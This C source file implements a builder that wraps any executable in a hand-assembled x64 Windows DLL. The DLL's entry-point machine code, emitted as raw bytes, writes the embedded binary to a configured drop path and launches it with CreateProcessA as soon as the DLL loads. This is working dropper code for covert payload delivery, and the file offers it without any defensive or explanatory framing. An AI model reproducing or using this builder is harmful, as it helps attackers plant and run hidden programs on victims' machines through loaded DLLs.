#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    enum {
        TEXT_RVA = 0x1000,
        RDATA_RVA = 0x2000,
        FILE_ALIGNMENT = 0x200,
        SECTION_ALIGNMENT = 0x1000
    };

    const char drop_path[] = DROP_PATH;
    HANDLE input = INVALID_HANDLE_VALUE;
    HANDLE output = INVALID_HANDLE_VALUE;
    unsigned char *binary = NULL;
    unsigned char *image = NULL;
    unsigned char *rdata = NULL;
    unsigned char *code = NULL;
    LARGE_INTEGER file_size;
    DWORD binary_size;
    size_t path_size;
    size_t rdata_size;
    size_t cursor;
    size_t code_size;
    size_t headers_size;
    size_t total_file_size;
    uint32_t int_offset;
    uint32_t iat_offset;
    uint32_t import_name_offsets[4];
    uint32_t dll_name_offset;
    uint32_t path_offset;
    uint32_t payload_offset;
    uint32_t api_iat_offsets[4];
    uint32_t rdata_raw_size;
    uint32_t code_raw_size;
    uint32_t reloc_rva;
    uint32_t reloc_raw_size;
    uint32_t reloc_raw_offset;
    uint32_t rdata_raw_offset;
    uint32_t code_raw_offset;
    uint32_t size_of_image;
    uint32_t fix_disp[64];
    uint32_t fix_target[64];
    unsigned char fix_type[64];
    size_t fix_count = 0;
    size_t cp = 0;
    size_t i;
    DWORD written;
    int result = -1;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt;
    IMAGE_SECTION_HEADER *sections;
    IMAGE_IMPORT_DESCRIPTOR *imports;
    IMAGE_THUNK_DATA64 *int_thunks;
    IMAGE_THUNK_DATA64 *iat_thunks;

    if (binary_path == NULL || dll_out_path == NULL)
        return -1;

    input = CreateFileA(binary_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (input == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(input, &file_size) || file_size.QuadPart <= 0 ||
        (uint64_t)file_size.QuadPart > UINT32_MAX)
        goto cleanup;

    binary_size = (DWORD)file_size.QuadPart;
    binary = (unsigned char *)malloc((size_t)binary_size);
    if (binary == NULL)
        goto cleanup;

    {
        DWORD offset = 0;
        while (offset < binary_size) {
            DWORD amount = binary_size - offset;
            if (!ReadFile(input, binary + offset, amount, &written, NULL) ||
                written == 0)
                goto cleanup;
            offset += written;
        }
    }

    if (!CloseHandle(input)) {
        input = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    input = INVALID_HANDLE_VALUE;

    path_size = strlen(drop_path) + 1;
    if (path_size > UINT32_MAX)
        goto cleanup;

    cursor = 2 * sizeof(IMAGE_IMPORT_DESCRIPTOR);
    cursor = (cursor + 7u) & ~(size_t)7u;
    int_offset = (uint32_t)cursor;
    cursor += 5 * sizeof(IMAGE_THUNK_DATA64);
    cursor = (cursor + 7u) & ~(size_t)7u;
    iat_offset = (uint32_t)cursor;
    cursor += 5 * sizeof(IMAGE_THUNK_DATA64);

    for (i = 0; i < 4; ++i) {
        static const char *const import_names[4] = {
            "CreateFileA", "WriteFile", "CloseHandle", "CreateProcessA"
        };
        cursor = (cursor + 1u) & ~(size_t)1u;
        import_name_offsets[i] = (uint32_t)cursor;
        cursor += sizeof(uint16_t) + strlen(import_names[i]) + 1;
    }

    dll_name_offset = (uint32_t)cursor;
    cursor += sizeof("KERNEL32.dll");
    path_offset = (uint32_t)cursor;
    cursor += path_size;
    cursor = (cursor + 15u) & ~(size_t)15u;
    payload_offset = (uint32_t)cursor;

    if (cursor > UINT32_MAX || (size_t)binary_size > UINT32_MAX - cursor)
        goto cleanup;
    rdata_size = cursor + (size_t)binary_size;
    if (rdata_size > UINT32_MAX)
        goto cleanup;

    rdata = (unsigned char *)calloc(1, rdata_size);
    code = (unsigned char *)calloc(1, 1024);
    if (rdata == NULL || code == NULL)
        goto cleanup;

    imports = (IMAGE_IMPORT_DESCRIPTOR *)rdata;
    int_thunks = (IMAGE_THUNK_DATA64 *)(rdata + int_offset);
    iat_thunks = (IMAGE_THUNK_DATA64 *)(rdata + iat_offset);

    imports[0].OriginalFirstThunk = RDATA_RVA + int_offset;
    imports[0].Name = RDATA_RVA + dll_name_offset;
    imports[0].FirstThunk = RDATA_RVA + iat_offset;

    for (i = 0; i < 4; ++i) {
        static const char *const import_names[4] = {
            "CreateFileA", "WriteFile", "CloseHandle", "CreateProcessA"
        };
        uint32_t name_rva = RDATA_RVA + import_name_offsets[i];
        memcpy(rdata + import_name_offsets[i], &(uint16_t){0}, sizeof(uint16_t));
        memcpy(rdata + import_name_offsets[i] + sizeof(uint16_t),
               import_names[i], strlen(import_names[i]) + 1);
        int_thunks[i].u1.AddressOfData = name_rva;
        iat_thunks[i].u1.AddressOfData = name_rva;
        api_iat_offsets[i] = iat_offset + (uint32_t)(i * sizeof(IMAGE_THUNK_DATA64));
    }

    memcpy(rdata + dll_name_offset, "KERNEL32.dll", sizeof("KERNEL32.dll"));
    memcpy(rdata + path_offset, drop_path, path_size);
    memcpy(rdata + payload_offset, binary, binary_size);

#define BUILD_EMIT(bytes) do { \
        static const unsigned char emitted_bytes[] = bytes; \
        if (cp + sizeof(emitted_bytes) - 1 > 1024) goto cleanup; \
        memcpy(code + cp, emitted_bytes, sizeof(emitted_bytes) - 1); \
        cp += sizeof(emitted_bytes) - 1; \
    } while (0)
#define BUILD_FIX(kind, target) do { \
        if (fix_count >= sizeof(fix_disp) / sizeof(fix_disp[0])) goto cleanup; \
        fix_disp[fix_count] = (uint32_t)cp; \
        fix_type[fix_count] = (unsigned char)(kind); \
        fix_target[fix_count] = (uint32_t)(target); \
        ++fix_count; \
    } while (0)

    BUILD_EMIT("\x83\xfa\x01\x0f\x85\x00\x00\x00\x00");
    BUILD_FIX(0, 0);

    BUILD_EMIT("\x48\x81\xec\xb8\x00\x00\x00");
    BUILD_EMIT("\x31\xc0");
    BUILD_EMIT("\x48\x89\x44\x24\x20");
    BUILD_EMIT("\x48\x89\x44\x24\x28");
    BUILD_EMIT("\x48\x89\x44\x24\x30");
    BUILD_EMIT("\x48\x89\x44\x24\x38");
    BUILD_EMIT("\x48\x89\x44\x24\x40");
    BUILD_EMIT("\x48\x89\x44\x24\x48");
    BUILD_EMIT("\x48\x89\x44\x24\x50");
    BUILD_EMIT("\x48\x89\x44\x24\x58");
    BUILD_EMIT("\x48\x89\x44\x24\x60");
    BUILD_EMIT("\x48\x89\x44\x24\x68");
    BUILD_EMIT("\x48\x89\x44\x24\x70");
    BUILD_EMIT("\x48\x89\x44\x24\x78");
    BUILD_EMIT("\x48\x89\x44\x24\x80");
    BUILD_EMIT("\x48\x89\x84\x24\x90\x00\x00\x00");
    BUILD_EMIT("\x48\x89\x84\x24\x98\x00\x00\x00");
    BUILD_EMIT("\x48\x89\x84\x24\xa0\x00\x00\x00");
    BUILD_EMIT("\xc7\x44\x24\x20\x68\x00\x00\x00");

    BUILD_EMIT("\x48\x8d\x0d\x00\x00\x00\x00");
    BUILD_FIX(1, path_offset);
    BUILD_EMIT("\xba\x00\x00\x00\x40");
    BUILD_EMIT("\x45\x33\xc0");
    BUILD_EMIT("\x45\x33\xc9");
    BUILD_EMIT("\xc7\x44\x24\x20\x02\x00\x00\x00");
    BUILD_EMIT("\xc7\x44\x24\x28\x80\x00\x00\x00");
    BUILD_EMIT("\xff\x15\x00\x00\x00\x00");
    BUILD_FIX(2, api_iat_offsets[0]);
    BUILD_EMIT("\x48\x89\x44\x24\x38");
    BUILD_EMIT("\x48\x85\xc0");
    BUILD_EMIT("\x0f\x84\x00\x00\x00\x00");
    BUILD_FIX(0, 0);
    BUILD_EMIT("\x48\x83\xf8\xff");
    BUILD_EMIT("\x0f\x84\x00\x00\x00\x00");
    BUILD_FIX(0, 0);

    BUILD_EMIT("\x48\x8b\x4c\x24\x38");
    BUILD_EMIT("\x48\x8d\x15\x00\x00\x00\x00");
    BUILD_FIX(1, payload_offset);
    BUILD_EMIT("\x41\xb8");
    {
        uint32_t value = binary_size;
        memcpy(code + cp, &value, sizeof(value));
        cp += sizeof(value);
    }
    BUILD_EMIT("\x4c\x8d\x8c\x24\x88\x00\x00\x00");
    BUILD_EMIT("\x48\xc7\x44\x24\x20\x00\x00\x00\x00");
    BUILD_EMIT("\xff\x15\x00\x00\x00\x00");
    BUILD_FIX(2, api_iat_offsets[1]);
    BUILD_EMIT("\x48\x8b\x4c\x24\x38");
    BUILD_EMIT("\xff\x15\x00\x00\x00\x00");
    BUILD_FIX(2, api_iat_offsets[2]);

    BUILD_EMIT("\x48\x8d\x0d\x00\x00\x00\x00");
    BUILD_FIX(1, path_offset);
    BUILD_EMIT("\x31\xd2");
    BUILD_EMIT("\x45\x33\xc0");
    BUILD_EMIT("\x45\x33\xc9");
    BUILD_EMIT("\x48\xc7\x44\x24\x20\x00\x00\x00\x00");
    BUILD_EMIT("\x48\xc7\x44\x24\x28\x00\x00\x00\x00");
    BUILD_EMIT("\x48\xc7\x44\x24\x30\x00\x00\x00\x00");
    BUILD_EMIT("\x48\xc7\x44\x24\x38\x00\x00\x00\x00");
    BUILD_EMIT("\x48\x8d\x44\x24\x20");
    BUILD_EMIT("\x48\x89\x44\x24\x40");
    BUILD_EMIT("\x48\x8d\x84\x24\x90\x00\x00\x00");
    BUILD_EMIT("\x48\x89\x44\x24\x48");
    BUILD_EMIT("\xff\x15\x00\x00\x00\x00");
    BUILD_FIX(2, api_iat_offsets[3]);
    BUILD_EMIT("\x85\xc0");
    BUILD_EMIT("\x0f\x84\x00\x00\x00\x00");
    BUILD_FIX(0, 0);
    BUILD_EMIT("\x48\x8b\x8c\x24\x90\x00\x00\x00");
    BUILD_EMIT("\x48\x85\xc9");
    BUILD_EMIT("\x0f\x84\x00\x00\x00\x00");
    BUILD_FIX(0, 0);
    BUILD_EMIT("\xff\x15\x00\x00\x00\x00");
    BUILD_FIX(2, api_iat_offsets[2]);
    BUILD_EMIT("\x48\x8b\x8c\x24\x98\x00\x00\x00");
    BUILD_EMIT("\x48\x85\xc9");
    BUILD_EMIT("\x0f\x84\x00\x00\x00\x00");
    BUILD_FIX(0, 0);
    BUILD_EMIT("\xff\x15\x00\x00\x00\x00");
    BUILD_FIX(2, api_iat_offsets[2]);

    BUILD_EMIT("\x48\x81\xc4\xb8\x00\x00\x00");
    BUILD_EMIT("\xb8\x01\x00\x00\x00\xc3");

    {
        uint32_t early_return = (uint32_t)cp;
        BUILD_EMIT("\xb8\x01\x00\x00\x00\xc3");
        for (i = 0; i < fix_count; ++i) {
            int64_t target_rva;
            int64_t next_rva;
            int32_t displacement;
            if (fix_type[i] == 0)
                target_rva = (int64_t)TEXT_RVA +
                    (fix_target[i] == 0 ? early_return : fix_target[i]);
            else if (fix_type[i] == 1)
                target_rva = (int64_t)RDATA_RVA + fix_target[i];
            else
                target_rva = (int64_t)RDATA_RVA + fix_target[i];
            next_rva = (int64_t)TEXT_RVA + fix_disp[i] + 4;
            if (target_rva - next_rva < INT32_MIN ||
                target_rva - next_rva > INT32_MAX)
                goto cleanup;
            displacement = (int32_t)(target_rva - next_rva);
            memcpy(code + fix_disp[i], &displacement, sizeof(displacement));
        }
    }
    code_size = cp;
#undef BUILD_FIX
#undef BUILD_EMIT

    {
        size_t nt_headers_end = 0x80 + sizeof(DWORD) +
            sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER64) +
            3 * sizeof(IMAGE_SECTION_HEADER);
        headers_size = (nt_headers_end + FILE_ALIGNMENT - 1) &
                       ~(size_t)(FILE_ALIGNMENT - 1);
    }

    code_raw_size = (uint32_t)((code_size + FILE_ALIGNMENT - 1) &
                               ~(size_t)(FILE_ALIGNMENT - 1));
    rdata_raw_size = (uint32_t)((rdata_size + FILE_ALIGNMENT - 1) &
                                ~(size_t)(FILE_ALIGNMENT - 1));
    reloc_rva = (uint32_t)((RDATA_RVA + rdata_size + SECTION_ALIGNMENT - 1) &
                           ~(size_t)(SECTION_ALIGNMENT - 1));
    reloc_raw_size = FILE_ALIGNMENT;
    code_raw_offset = (uint32_t)headers_size;
    rdata_raw_offset = code_raw_offset + code_raw_size;
    reloc_raw_offset = rdata_raw_offset + rdata_raw_size;
    total_file_size = (size_t)reloc_raw_offset + reloc_raw_size;
    size_of_image = (uint32_t)((reloc_rva + 12 + SECTION_ALIGNMENT - 1) &
                               ~(size_t)(SECTION_ALIGNMENT - 1));

    if (total_file_size > UINT32_MAX || total_file_size < headers_size)
        goto cleanup;

    image = (unsigned char *)calloc(1, total_file_size);
    if (image == NULL)
        goto cleanup;

    dos = (IMAGE_DOS_HEADER *)image;
    dos->e_magic = IMAGE_DOS_SIGNATURE;
    dos->e_lfanew = 0x80;

    nt = (IMAGE_NT_HEADERS64 *)(image + dos->e_lfanew);
    nt->Signature = IMAGE_NT_SIGNATURE;
    nt->FileHeader.Machine = IMAGE_FILE_MACHINE_AMD64;
    nt->FileHeader.NumberOfSections = 3;
    nt->FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
    nt->FileHeader.Characteristics = IMAGE_FILE_EXECUTABLE_IMAGE |
                                     IMAGE_FILE_DLL |
                                     IMAGE_FILE_LARGE_ADDRESS_AWARE;

    nt->OptionalHeader.Magic = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    nt->OptionalHeader.MajorLinkerVersion = 1;
    nt->OptionalHeader.SizeOfCode = code_raw_size;
    nt->OptionalHeader.SizeOfInitializedData = rdata_raw_size + reloc_raw_size;
    nt->OptionalHeader.AddressOfEntryPoint = TEXT_RVA;
    nt->OptionalHeader.BaseOfCode = TEXT_RVA;
    nt->OptionalHeader.ImageBase = UINT64_C(0x180000000);
    nt->OptionalHeader.SectionAlignment = SECTION_ALIGNMENT;
    nt->OptionalHeader.FileAlignment = FILE_ALIGNMENT;
    nt->OptionalHeader.MajorOperatingSystemVersion = 6;
    nt->OptionalHeader.MajorSubsystemVersion = 6;
    nt->OptionalHeader.SizeOfImage = size_of_image;
    nt->OptionalHeader.SizeOfHeaders = (DWORD)headers_size;
    nt->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_CUI;
    nt->OptionalHeader.DllCharacteristics = IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE |
                                           IMAGE_DLLCHARACTERISTICS_NX_COMPAT |
                                           IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA;
    nt->OptionalHeader.SizeOfStackReserve = 0x100000;
    nt->OptionalHeader.SizeOfStackCommit = 0x1000;
    nt->OptionalHeader.SizeOfHeapReserve = 0x100000;
    nt->OptionalHeader.SizeOfHeapCommit = 0x1000;
    nt->OptionalHeader.NumberOfRvaAndSizes = IMAGE_NUMBEROF_DIRECTORY_ENTRIES;
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress =
        RDATA_RVA;
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size =
        2 * sizeof(IMAGE_IMPORT_DESCRIPTOR);
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress =
        RDATA_RVA + iat_offset;
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size =
        5 * sizeof(IMAGE_THUNK_DATA64);
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress =
        reloc_rva;
    nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 12;

    sections = (IMAGE_SECTION_HEADER *)((unsigned char *)&nt->OptionalHeader +
                                       sizeof(IMAGE_OPTIONAL_HEADER64));
    memcpy(sections[0].Name, ".text", 5);
    sections[0].Misc.VirtualSize = (DWORD)code_size;
    sections[0].VirtualAddress = TEXT_RVA;
    sections[0].SizeOfRawData = code_raw_size;
    sections[0].PointerToRawData = code_raw_offset;
    sections[0].Characteristics = IMAGE_SCN_CNT_CODE |
                                  IMAGE_SCN_MEM_EXECUTE |
                                  IMAGE_SCN_MEM_READ;

    memcpy(sections[1].Name, ".rdata", 6);
    sections[1].Misc.VirtualSize = (DWORD)rdata_size;
    sections[1].VirtualAddress = RDATA_RVA;
    sections[1].SizeOfRawData = rdata_raw_size;
    sections[1].PointerToRawData = rdata_raw_offset;
    sections[1].Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA |
                                  IMAGE_SCN_MEM_READ;

    memcpy(sections[2].Name, ".reloc", 6);
    sections[2].Misc.VirtualSize = 12;
    sections[2].VirtualAddress = reloc_rva;
    sections[2].SizeOfRawData = reloc_raw_size;
    sections[2].PointerToRawData = reloc_raw_offset;
    sections[2].Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA |
                                  IMAGE_SCN_MEM_READ |
                                  IMAGE_SCN_MEM_DISCARDABLE;

    memcpy(image + code_raw_offset, code, code_size);
    memcpy(image + rdata_raw_offset, rdata, rdata_size);

    {
        IMAGE_BASE_RELOCATION *reloc =
            (IMAGE_BASE_RELOCATION *)(image + reloc_raw_offset);
        uint16_t *entries = (uint16_t *)(image + reloc_raw_offset +
                                         sizeof(IMAGE_BASE_RELOCATION));
        reloc->VirtualAddress = TEXT_RVA;
        reloc->SizeOfBlock = 12;
        entries[0] = 0;
        entries[1] = 0;
    }

    output = CreateFileA(dll_out_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                         FILE_ATTRIBUTE_NORMAL, NULL);
    if (output == INVALID_HANDLE_VALUE)
        goto cleanup;

    {
        size_t offset = 0;
        while (offset < total_file_size) {
            DWORD amount = (DWORD)((total_file_size - offset) > UINT32_MAX
                                       ? UINT32_MAX
                                       : (total_file_size - offset));
            if (!WriteFile(output, image + offset, amount, &written, NULL) ||
                written == 0)
                goto cleanup;
            offset += written;
        }
    }

    if (!FlushFileBuffers(output))
        goto cleanup;
    if (!CloseHandle(output)) {
        output = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    output = INVALID_HANDLE_VALUE;
    result = 0;

cleanup:
    if (input != INVALID_HANDLE_VALUE)
        CloseHandle(input);
    if (output != INVALID_HANDLE_VALUE)
        CloseHandle(output);
    if (result != 0 && dll_out_path != NULL)
        DeleteFileA(dll_out_path);
    free(image);
    free(rdata);
    free(code);
    free(binary);
    return result;
}